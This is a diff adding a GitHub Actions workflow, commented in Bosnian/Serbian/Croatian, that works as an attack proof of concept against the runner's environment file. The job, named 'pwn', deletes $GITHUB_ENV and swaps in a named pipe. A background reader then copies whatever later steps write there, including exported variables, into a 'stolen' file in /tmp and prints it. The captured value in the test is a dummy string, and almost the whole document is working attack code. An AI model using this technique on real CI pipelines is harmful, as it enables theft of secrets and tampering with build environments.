@@ -1,0 +1,47 @@
+name: 2. IPC Pipe Strike
+on: workflow_dispatch
+
+permissions:
+  issues: write
+
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Git Checkout
+        uses: actions/checkout@v3
+
+      - name: Pravljenje Zamke (The Pipe)
+        run: |
+          echo "[*] Oktopod analizira IPC rute..."
+          echo "GITHUB_ENV pokazuje na: $GITHUB_ENV"
+          
+          # 1. Brisemo originalni fajl koji koristi GitHub orkestrator
+          rm -f $GITHUB_ENV
+          
+          # 2. Pravimo Named Pipe (FIFO) sa POTPUNO ISTIM imenom!
+          mkfifo $GITHUB_ENV
+          
+          # 3. Pokrecemo duha u pozadini koji ce citati iz te cijevi
+          # Sve sto GitHub procesi pokusaju upisati u ENV, zavrsice ovdje!
+          (
+            echo "[+] Duh slusa na cijevi..."
+            cat < $GITHUB_ENV > /tmp/ukradeni_env.txt
+          ) &
+          
+      - name: Mamac (GitHub proces upisuje tajne)
+        # Ovdje koristimo zvanicni github-script
+        # Kada on proba komunicirati sa sistemom, on upisuje u GITHUB_ENV!
+        uses: actions/github-script@v6
+        with:
+          script: |
+            core.exportVariable('OKTOPOD_TAJNA', 'Ovo je usisano!');
+            
+      - name: Citanje Plijena
+        run: |
+          echo "[*] Sta smo ulovili iz cijevi?"
+          cat /tmp/ukradeni_env.txt || echo "Nema plijena"
+          
+          # Vrlo bitno: Cistimo cijev da posao ne bi ostao zaledjen (Deadlock)
+          rm $GITHUB_ENV
+          touch $GITHUB_ENV
